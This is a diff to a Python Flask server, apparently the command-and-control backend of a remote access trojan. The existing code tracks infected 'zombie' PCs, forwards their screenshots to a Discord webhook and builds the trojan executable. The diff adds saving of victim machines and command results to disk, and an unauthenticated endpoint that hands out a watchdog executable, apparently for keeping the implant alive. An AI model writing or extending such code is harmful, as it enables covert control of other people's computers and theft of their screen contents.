@@ -37,6 +37,39 @@ pc_lock = threading.RLock()
 result_lock = threading.Lock()
 sse_clients = defaultdict(list)
 
+# Persistencia em disco
+DATA_FILE = os.path.join(os.path.dirname(os.path.abspath(__file__)), 'data', 'state.json')
+
+def save_state():
+    try:
+        os.makedirs(os.path.dirname(DATA_FILE), exist_ok=True)
+        with pc_lock, result_lock:
+            state = {
+                'pcs': {k: {'status': v.get('status','OFFLINE'), 'last_heartbeat': v.get('last_heartbeat',0),
+                            'registered_at': v.get('registered_at','')} for k, v in connected_pcs.items()},
+                'results': command_results
+            }
+        with open(DATA_FILE, 'w') as f:
+            json.dump(state, f)
+    except Exception as e:
+        logger.error(f"Erro ao salvar estado: {e}")
+
+def load_state():
+    global connected_pcs, command_results
+    try:
+        if os.path.exists(DATA_FILE):
+            with open(DATA_FILE, 'r') as f:
+                state = json.load(f)
+            with pc_lock:
+                for name, info in state.get('pcs', {}).items():
+                    info['status'] = 'OFFLINE'
+                    connected_pcs[name] = info
+            with result_lock:
+                command_results = state.get('results', {})
+            logger.info(f"[STATE] Carregados {len(connected_pcs)} PCs do disco")
+    except Exception as e:
+        logger.error(f"Erro ao carregar estado: {e}")
+
 # Webhook Discord
 DISCORD_WEBHOOK = os.environ.get('DISCORD_WEBHOOK', '')
 
@@ -59,7 +92,7 @@ def send_to_discord(pc_name, screenshot_base64):
         return False
 
 def cleanup_zombie_pcs():
-    """Remove PCs offline por mais de 30s, marca como offline"""
+    """Remove PCs offline por mais de 30s, marca como offline + salva estado"""
     global connected_pcs
     
     while True:
@@ -75,6 +108,7 @@ def cleanup_zombie_pcs():
                         connected_pcs[pc_name]['status'] = 'OFFLINE'
                         logger.info(f"[ZOMBIE] {pc_name} marcado como OFFLINE ({offline_time:.0f}s)")
                         broadcast_pc_update()
+                save_state()
         except Exception as e:
             logger.error(f"Erro no cleanup: {e}")
 
@@ -516,6 +550,23 @@ def build_rat_exe():
         logger.error(f"[BUILD] Erro ao enviar arquivo: {e}")
         return jsonify({"error": str(e)}), 500
 
+@app.route('/api/watchdog', methods=['GET'])
+def download_watchdog():
+    """Serve o watchdog.exe compilado ou o .py source"""
+    from pathlib import Path
+    dist_dir = Path(app.root_path) / 'dist'
+    
+    exe_path = dist_dir / 'watchdog.exe'
+    if exe_path.exists():
+        return send_from_directory(str(dist_dir), 'watchdog.exe', as_attachment=True)
+    
+    py_path = Path(app.root_path) / 'watchdog.py'
+    if py_path.exists():
+        return send_from_directory(str(Path(app.root_path)), 'watchdog.py', as_attachment=True)
+    
+    return jsonify({"error": "watchdog nao encontrado"}), 404
+
+
 @app.route('/api/download', methods=['GET'])
 @require_login
 def download_exe():
@@ -607,10 +658,10 @@ def broadcast_notification(notification_type, title, message, pc_name=None):
         logger.error(f"[NOTIF] Erro ao enviar notificação: {e}")
 
 if __name__ == '__main__':
+    load_state()
     cleanup_thread = threading.Thread(target=cleanup_zombie_pcs, daemon=True)
     cleanup_thread.start()
     
     logger.info("[INICIANDO] Web API Docker com Terminal Interativo")
-    logger.info(f"[WEBHOOK] Configurado para: {DISCORD_WEBHOOK[:50]}...")
     
     socketio.run(app, host='0.0.0.0', port=5000, debug=False, allow_unsafe_werkzeug=True)
